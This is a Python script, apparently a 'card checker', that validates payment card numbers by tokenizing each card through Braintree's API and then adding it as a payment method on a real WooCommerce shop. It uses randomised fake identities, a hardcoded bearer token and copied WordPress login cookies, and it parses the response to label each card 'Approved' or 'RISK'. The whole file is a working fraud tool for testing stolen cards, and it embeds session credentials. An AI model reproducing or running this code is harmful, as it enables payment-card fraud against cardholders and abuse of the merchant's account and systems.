def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	r.verify = False
	
	user = user_agent.generate_user_agent()
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
	                   
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    
	    return first_name, last_name
	
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	
	
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
	
	
	def generate_random_code(length=32):
	    letters_and_digits = string.ascii_letters + string.digits
	    return ''.join(random.choice(letters_and_digits) for _ in range(length))
	
	corr = generate_random_code()
	
	sess = generate_random_code()

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,ca-EG;q=0.6,ca;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjMzMjQ5NTEsImp0aSI6IjFlZWZlY2UxLWQ0NWMtNGFjYS1hN2MwLWRlMDY0ZGQyMzkxMSIsInN1YiI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.Xlh6fIQWh70y-Z4OLA-Hf2TP-Bdo2Ja9WzELMPF-a44c-Z5eEZjKLOEYWK0dMQTopFn5vv28yTZ5WPq2RRBw4g',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'dfa7873e-1380-4f84-ba3e-fd23f6649451',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tok = response.json()['data']['tokenizeCreditCard']['token']


	cookies = {
    'cookielawinfo-checkbox-necessary': 'yes',
    '_gcl_au': '1.1.2142424807.1718318809',
    '_ga': 'GA1.1.1545357320.1718318810',
    'cookielawinfo-checkbox-functional': 'yes',
    'cookielawinfo-checkbox-performance': 'yes',
    'cookielawinfo-checkbox-analytics': 'yes',
    'cookielawinfo-checkbox-advertisement': 'yes',
    'cookielawinfo-checkbox-others': 'yes',
    'viewed_cookie_policy': 'yes',
    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
    '_fbp': 'fb.1.1718318810389.396479930931177057',
    'newpass_announce': 'true',
    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'yousefvbvsisj1%7C1724447825%7CYmiXpZpWBO6abaz7DC05MZxrwPAemiq1nzcYNzvZ9F6%7Cca256d6c07cdb0774d736e5340bfdd2064a65cdc065ca53376746d3dce09b83f',
    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'yousefvbvsisj1%7C1724447825%7CYmiXpZpWBO6abaz7DC05MZxrwPAemiq1nzcYNzvZ9F6%7Ca8572b63896ecc1ea9fc406fb126914997739f5437c925f0079620d24e09f188',
    'br_lgv_stat': 'default%7Cdefault',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-09%2021%3A20%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fedit-address%2F',
    'sbjs_first_add': 'fd%3D2024-08-09%2021%3A20%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fedit-address%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
    '__kla_id': 'eyJjaWQiOiJPV00wTW1VM00yTXRabU0yWXkwMFpUaGxMVGxsWVRrdFpXUTBaV0V4TnpJeFptTTEiLCIkZXhjaGFuZ2VfaWQiOiJyMzVlc3d1dUdMLVFVbU0xa1JyQm5FRUJxb3g1RTVDbGczbGx2c3d1aEhycG5QQjFkamlkOC0wOC11cUY3U2d3LlU0VFNxUCIsIiRyZWZlcnJlciI6eyJ0cyI6MTcyMzIzODI1NywidmFsdWUiOiJodHRwczovL2NlNGxlc3MuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL2NlNGxlc3MuY29tL215LWFjY291bnQvZWRpdC1hZGRyZXNzLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcyMzIzODU0OCwidmFsdWUiOiJodHRwczovL2NlNGxlc3MuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL2NlNGxlc3MuY29tL215LWFjY291bnQvZWRpdC1hZGRyZXNzLyJ9fQ==',
    '_ga_JVCGZDD7ML': 'GS1.1.1723238192.19.1.1723238547.58.1.131070791',
    '_uetsid': 'a7ea9830569411efb83bc75a50488909',
    '_uetvid': 'd26b25e029d611efaae0afe755aa4081',
}

	headers = {
    'authority': 'ce4less.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,ca-EG;q=0.6,ca;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; _gcl_au=1.1.2142424807.1718318809; _ga=GA1.1.1545357320.1718318810; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; _fbp=fb.1.1718318810389.396479930931177057; newpass_announce=true; wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7=yousefvbvsisj1%7C1724447825%7CYmiXpZpWBO6abaz7DC05MZxrwPAemiq1nzcYNzvZ9F6%7Cca256d6c07cdb0774d736e5340bfdd2064a65cdc065ca53376746d3dce09b83f; wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7=yousefvbvsisj1%7C1724447825%7CYmiXpZpWBO6abaz7DC05MZxrwPAemiq1nzcYNzvZ9F6%7Ca8572b63896ecc1ea9fc406fb126914997739f5437c925f0079620d24e09f188; br_lgv_stat=default%7Cdefault; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-09%2021%3A20%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fedit-address%2F; sbjs_first_add=fd%3D2024-08-09%2021%3A20%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fedit-address%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F; __kla_id=eyJjaWQiOiJPV00wTW1VM00yTXRabU0yWXkwMFpUaGxMVGxsWVRrdFpXUTBaV0V4TnpJeFptTTEiLCIkZXhjaGFuZ2VfaWQiOiJyMzVlc3d1dUdMLVFVbU0xa1JyQm5FRUJxb3g1RTVDbGczbGx2c3d1aEhycG5QQjFkamlkOC0wOC11cUY3U2d3LlU0VFNxUCIsIiRyZWZlcnJlciI6eyJ0cyI6MTcyMzIzODI1NywidmFsdWUiOiJodHRwczovL2NlNGxlc3MuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL2NlNGxlc3MuY29tL215LWFjY291bnQvZWRpdC1hZGRyZXNzLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcyMzIzODU0OCwidmFsdWUiOiJodHRwczovL2NlNGxlc3MuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL2NlNGxlc3MuY29tL215LWFjY291bnQvZWRpdC1hZGRyZXNzLyJ9fQ==; _ga_JVCGZDD7ML=GS1.1.1723238192.19.1.1723238547.58.1.131070791; _uetsid=a7ea9830569411efb83bc75a50488909; _uetvid=d26b25e029d611efaae0afe755aa4081',
    'origin': 'https://ce4less.com',
    'pragma': 'no-cache',
    'referer': 'https://ce4less.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': '3c11155241',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	

	
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	
				
	return result